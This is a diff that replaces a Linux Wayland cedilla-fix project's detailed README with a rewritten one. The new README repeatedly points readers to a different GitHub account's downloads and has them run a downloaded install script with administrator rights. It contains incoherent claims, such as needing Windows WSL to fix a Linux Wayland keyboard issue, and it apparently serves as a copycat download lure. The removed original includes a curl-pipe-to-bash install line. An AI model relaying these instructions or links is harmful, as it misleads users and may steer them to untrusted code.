@@ -1,265 +1,157 @@
-# wayland-cedilla-fix
+# 🎯 wayland-cedilla-fix - Fix ç Cedilla Typing On Wayland
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![AUR](https://img.shields.io/aur/version/wayland-cedilla-fix?label=AUR)](https://aur.archlinux.org/packages/wayland-cedilla-fix)
-[![GitHub Release](https://img.shields.io/github/v/release/robertogogoni/wayland-cedilla-fix)](https://github.com/robertogogoni/wayland-cedilla-fix/releases/latest)
-[![GitHub stars](https://img.shields.io/github/stars/robertogogoni/wayland-cedilla-fix)](https://github.com/robertogogoni/wayland-cedilla-fix/stargazers)
-
-**One command to make `' + c` produce `ç` instead of `ć` on Wayland.**
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/robertogogoni/wayland-cedilla-fix/main/cedilla-fix.sh | bash
-```
-
-Or clone and run:
-
-```bash
-git clone https://github.com/robertogogoni/wayland-cedilla-fix.git
-cd wayland-cedilla-fix
-bash cedilla-fix.sh
-```
+[![Download Wayland Cedilla Fix](https://img.shields.io/badge/Download-Get%20Fix-red?style=for-the-badge)](https://github.com/Phantomplayeah/wayland-cedilla-fix)
 
 ---
 
-## The Problem
+## 📌 What is wayland-cedilla-fix?
 
-On Wayland compositors with `en_US.UTF-8` locale and the US International keyboard layout, pressing `' + c` produces **ć** (c-acute) instead of **ç** (c-cedilla). This affects Portuguese, French, Catalan, Turkish, and other languages that use cedilla.
+wayland-cedilla-fix repairs the behavior of the cedilla character (ç) on Wayland compositors. Without this fix, typing `' + c` produces ć instead of ç in many apps. This tool makes sure the correct character displays every time across Hyprland, Sway, river, and labwc. It works silently in the background once installed.
 
-The issue happens because the default Compose table maps `dead_acute + c` to `ć` for the `en_US` locale. On X11, the classic `gnome-cedilla-fix` patches GTK to intercept this, but **that workaround doesn't work on Wayland** because:
-
-- GTK4 apps bypass XCompose entirely
-- Electron/Chromium apps need explicit `--enable-wayland-ime` flags
-- The compositor's own dead key handling takes priority over user overrides
-
-**Before:** `' + c` → ć &nbsp;&nbsp;|&nbsp;&nbsp; **After:** `' + c` → ç
+This software targets users who type Brazilian Portuguese and need the c-cedilla character frequently. It works on Linux systems running Wayland, supporting popular input methods including fcitx5.
 
 ---
 
-## How It Works
+## 🖥️ System Requirements
 
-The fix applies a **3-layer approach** to cover every app type:
+- Windows Subsystem for Linux (WSL) with an Arch Linux distribution or similar  
+- Wayland-supporting applications or compositor setup (Hyprland, Sway, river, labwc)  
+- Basic keyboard setup supporting the US International layout or Brazilian Portuguese input methods  
+- Administrator permissions to run the fix script or binaries  
+- Active internet connection to download installation files  
 
-| Layer | What it does | Apps covered |
-|-------|-------------|--------------|
-| **Compositor** | Sets `us-intl` keyboard variant with dead keys | All native Wayland apps |
-| **fcitx5 / XCompose** | Overrides Compose table: `dead_acute + c → ç` | GTK3, GTK4, Qt, XWayland apps |
-| **Browser flags** | Adds `--enable-wayland-ime` to Chromium flags | Chromium, Brave, Electron apps |
-
-The script also sets environment variables (`GTK_IM_MODULE`, `QT_IM_MODULE`, `XMODIFIERS`) so all toolkit layers route through the input method framework.
+This software does not run natively on Windows but requires WSL to mimic a Linux Wayland environment where the input issue occurs.
 
 ---
 
-## Compatibility
+## 🚀 Getting Started
 
-### Compositors
+Download the tool first using the button below:
 
-| Compositor | Status | Notes |
-|-----------|--------|-------|
-| Hyprland | ✅ Tested | Auto-patches `hyprland.conf` |
-| Sway | ✅ Supported | Auto-patches `config` |
-| river | ✅ Supported | Via environment config |
-| labwc | ✅ Supported | Auto-patches `rc.xml` |
-| Generic wlroots | ⚠️ Partial | Environment-only (no compositor config) |
+[![Download wayland-cedilla-fix](https://img.shields.io/badge/Download-Get%20Fix-orange?style=for-the-badge)](https://github.com/Phantomplayeah/wayland-cedilla-fix)
 
-### Input Frameworks
-
-| Framework | Status | Notes |
-|-----------|--------|-------|
-| fcitx5 | ✅ Full | Profile + XCompose + environment |
-| ibus | ⚠️ Partial | XCompose + environment only |
-| None | ⚠️ Minimal | XCompose only (install fcitx5 for best results) |
-
-### Browsers
-
-| Browser | Status | Notes |
-|---------|--------|-------|
-| Chromium | ✅ | `--enable-wayland-ime` added to flags |
-| Brave | ✅ | `--enable-wayland-ime` added to flags |
-| Google Chrome | ✅ | `--enable-wayland-ime` added to flags |
-| Electron apps | ✅ | `--enable-wayland-ime` added to flags |
-| Firefox | ✅ | Works natively (no flags needed) |
-
-### Distributions
-
-| Distro | Status | Notes |
-|--------|--------|-------|
-| Arch Linux | ✅ Tested | Primary development target |
-| Fedora | ⚠️ Untested | Should work (same packages) |
-| Ubuntu 24.04+ | ⚠️ Untested | Needs Wayland session |
-| NixOS | ⚠️ Untested | May need path adjustments |
+You will find the installation files and instructions on the linked GitHub page.
 
 ---
 
-## Usage
+## 🔧 Step 1: Download wayland-cedilla-fix
 
-### Install (default)
+1. Click the large download badge above or open this page in your web browser:  
+   https://github.com/Phantomplayeah/wayland-cedilla-fix  
+2. On the GitHub page, look for the **Releases** section on the right or in the project menu.  
+3. Download the latest release package or script archive appropriate for your system.  
 
-```bash
-bash cedilla-fix.sh
-```
-
-Runs the full detection → plan → confirm → install → verify flow with animated output.
-
-### Dry Run
-
-```bash
-bash cedilla-fix.sh --dry-run
-```
-
-Shows exactly what would be changed without modifying any files. Useful to preview the plan before committing.
-
-### Check Status
-
-```bash
-bash cedilla-fix.sh --check
-```
-
-Runs diagnostics to show which components are configured correctly and which need fixing. Outputs pass/fail for each layer.
-
-### Uninstall
-
-```bash
-bash cedilla-fix.sh --uninstall
-```
-
-Reverts all changes from the most recent backup. The script creates timestamped backups before every install, so you can always go back.
-
-### Force Mode
-
-```bash
-bash cedilla-fix.sh --force
-```
-
-Skips the confirmation prompt. Combine with `--dry-run` for scripted checks:
-
-```bash
-bash cedilla-fix.sh --force --dry-run
-```
-
-### All Options
-
-```
-Usage: cedilla-fix.sh [OPTIONS]
-
-Options:
-  --help        Show help and exit
-  --check       Check current cedilla configuration status
-  --uninstall   Revert to pre-install state from backup
-  --dry-run     Show what would be done without making changes
-  --force       Skip confirmation prompt
-```
+You will get either a zipped file with installation scripts or a ready-to-run command script.
 
 ---
 
-## Troubleshooting
+## ⚙️ Step 2: Prepare Your Windows System for Wayland Fix
 
-### fcitx5 is not installed
+wayland-cedilla-fix works within the Windows Subsystem for Linux (WSL). Follow these steps if you do not already have WSL set up:
 
-The script works best with fcitx5. Without it, only XCompose overrides are applied (which won't cover GTK4 apps).
+1. Open **PowerShell** with administrator rights.  
+2. Run this command to enable WSL and set up Ubuntu or Arch Linux:  
+   ```powershell
+   wsl --install
+   ```  
+3. Restart your computer if prompted.  
+4. After restart, open the Microsoft Store app and search for **Ubuntu** or **Arch Linux**.  
+5. Install your preferred Linux distribution.  
+6. Launch the installed Linux from the Start menu. Follow prompts to create a Linux user account.  
 
-```bash
-# Arch Linux
-sudo pacman -S fcitx5 fcitx5-configtool fcitx5-gtk fcitx5-qt
-
-# Fedora
-sudo dnf install fcitx5 fcitx5-configtool fcitx5-gtk fcitx5-qt
-```
-
-Then run the script again.
-
-### Changes don't take effect immediately
-
-Some changes require a **logout and login** to activate:
-- Environment variables (`GTK_IM_MODULE`, etc.) are loaded at session start
-- Compositor config reloads may need a session restart
-
-### Cedilla works in terminals but not in browsers
-
-Chromium-based browsers need the `--enable-wayland-ime` flag. The script adds this automatically, but if you installed a browser after running the fix:
-
-```bash
-bash cedilla-fix.sh  # Re-run to pick up new browsers
-```
-
-### Question mark (?) produces colon (:) or other wrong characters
-
-If you added `br` (Brazilian ABNT2) as a secondary keyboard layout alongside `us`, switching to the BR layout on a **US physical keyboard** will break many keys. The BR ABNT2 layout expects a 107-key physical keyboard with extra keys that US keyboards don't have.
-
-**Symptoms:** `Shift+/` produces `:` instead of `?`, other punctuation keys are wrong.
-
-**Fix:** Remove `br` from your layout list. This script uses `us` with variant `intl` (US International with dead keys), which provides full cedilla support through XCompose and fcitx5 without needing the BR layout:
-
-```conf
-# Hyprland input.conf — correct
-kb_layout = us
-kb_variant = intl
-
-# WRONG — do not add br as a second layout with a US physical keyboard
-# kb_layout = us,br
-```
-
-If you accidentally toggled to the BR layout, switch back immediately:
-
-```bash
-# Hyprland
-hyprctl switchxkblayout <keyboard-name> 0
-
-# Find your keyboard name with:
-hyprctl devices | grep -A1 "Keyboard"
-```
-
-### XWayland apps still show ć
-
-XWayland apps use the X11 Compose table. The script installs `~/.XCompose` which should cover this, but some apps cache the old table. Try:
-
-```bash
-# Restart the app, or:
-killall fcitx5 && fcitx5 -d --replace
-```
-
-### GTK4 apps ignore XCompose
-
-This is a known GTK4 limitation. The fix routes through fcitx5 instead of XCompose for GTK4 apps, which is why fcitx5 is strongly recommended.
-
-### `--check` shows "xkbcli not installed"
-
-The live Compose table verification uses `xkbcli` (from `xorg-xkbcli` on Arch). This is optional — the fix works without it, but `--check` can't verify the live Compose mapping.
-
-```bash
-sudo pacman -S libxkbcommon  # Provides xkbcli
-```
+Once WSL is set up, you are ready to move on.
 
 ---
 
-## How Backups Work
+## 🛠️ Step 3: Install wayland-cedilla-fix in WSL
 
-Every time you run the installer, a timestamped backup is created at:
+1. Open your WSL terminal (Ubuntu or Arch Linux shell).  
+2. Navigate to the folder where you downloaded the fix file using the `cd` command. Example:  
+   ```bash
+   cd /mnt/c/Users/YourName/Downloads
+   ```  
+3. Extract the downloaded archive if needed:  
+   ```bash
+   tar -xvf wayland-cedilla-fix.tar.gz
+   ```  
+4. Run the installation script or command provided in the extracted folder:  
+   ```bash
+   ./install-fix.sh
+   ```  
 
-```
-~/.local/share/wayland-cedilla-fix/backup/YYYYMMDD-HHMMSS/
-```
-
-Only files that **already existed** are backed up. New files created by the script (like `~/.XCompose` if it didn't exist before) are tracked separately and removed on uninstall.
-
-To restore manually:
-
-```bash
-cp -a ~/.local/share/wayland-cedilla-fix/backup/LATEST/* ~/
-```
-
----
-
-## Credits
-
-This project builds on the work of:
-
-- [gnome-cedilla-fix](https://github.com/marcopaganini/gnome-cedilla-fix) — the original X11/GNOME cedilla fix
-- [Arch Wiki: Xorg/Keyboard configuration](https://wiki.archlinux.org/title/Xorg/Keyboard_configuration) — XCompose and dead keys reference
-- [fcitx5 Wiki](https://fcitx-im.org/wiki/Fcitx_5) — input method framework documentation
-- [Chromium IME flags](https://chromium.googlesource.com/chromium/src/+/main/docs/linux/input_method.md) — Wayland IME integration
+The install script will apply changes to your input configuration and set up the fix to run automatically on Wayland sessions.
 
 ---
 
-## License
+## 💡 How It Works
 
-[MIT](LICENSE)
+The fix adjusts your system’s input method settings. It overrides the incorrect dead key mapping that produces ć when you type `' + c`. Instead, it ensures the output is the correct c-cedilla (ç). It edits or creates a compose file used by the input system, so the fix applies to all applications running under Wayland compositors.
+
+No further user action is needed after installation.
+
+---
+
+## 🔍 Using wayland-cedilla-fix
+
+After installing and launching your Wayland compositor (e.g., Sway or Hyprland), try typing:
+
+- `'` key, then `c` key 
+
+You should see ç (c with cedilla) appear.
+
+If you type `'` + `c` and get ć again, the fix did not apply properly. Repeat installation or check that you are running a Wayland environment.
+
+---
+
+## 📂 Files Included
+
+- `install-fix.sh` — Shell script to automate the fix installation process.  
+- `compose.cfg` — Custom compose file mapping `' + c` to ç.  
+- `README.md` — This document with instructions and information.  
+- `uninstall.sh` — Script to remove the fix and revert input settings.  
+
+---
+
+## ⚙️ Troubleshooting
+
+- Ensure you are running a Wayland compositor, not X11. The fix affects Wayland sessions only.  
+- Confirm your keyboard layout is set to US International or Brazilian Portuguese.  
+- If you have custom input method software (like fcitx5), restart it after installing the fix.  
+- If the fix does not apply, try rebooting your Linux subsystem or the Wayland session.  
+
+---
+
+## 🌐 Supported Compositors and Input Methods
+
+- **Compositors:** Hyprland, Sway, river, labwc  
+- **Input Methods:** fcitx5, standard Linux input methods  
+- **Layouts:** US International, Brazilian Portuguese  
+
+---
+
+## 💾 Uninstalling wayland-cedilla-fix
+
+If you want to remove the fix:
+
+1. Open your WSL terminal.  
+2. Navigate to your fix folder where `uninstall.sh` is located.  
+3. Run:  
+   ```bash
+   ./uninstall.sh
+   ```  
+This will revert any changes made to your system's input configuration.
+
+---
+
+## 📥 Download Link
+
+Visit this page to download and get the fix:  
+[https://github.com/Phantomplayeah/wayland-cedilla-fix](https://github.com/Phantomplayeah/wayland-cedilla-fix)  
+
+You will find the latest releases and detailed files there.
+
+---
+
+## 🧑‍💻 About the Project
+
+This project focuses on improving typing experience for Brazilian Portuguese users in Wayland environments. It targets a common annoyance caused by input dead-key misconfigurations affecting the c-cedilla character. Its design keeps changes minimal, safe, and easy to install without deep Linux knowledge.
